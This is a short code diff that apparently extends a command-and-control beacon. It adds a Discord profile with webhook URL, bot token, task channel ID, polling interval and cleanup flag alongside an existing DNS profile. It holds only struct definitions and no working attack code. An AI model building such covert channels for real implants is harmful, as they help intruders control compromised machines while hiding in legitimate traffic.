@@ -64,6 +64,14 @@ typedef struct {
 	BYTE* user_agent;
 } ProfileDNS;
 
+typedef struct {
+	BYTE* webhook_url;
+	BYTE* bot_token;
+	BYTE* channel_tasks_id;
+	ULONG poll_interval;
+	BOOL  cleanup;
+} ProfileDiscord;
+
 #endif
 
 
@@ -94,6 +102,9 @@ public:
 
 #elif defined(BEACON_DNS)
 	ProfileDNS profile;
+
+#elif defined(BEACON_DISCORD)
+	ProfileDiscord profile;
 
 #endif
 
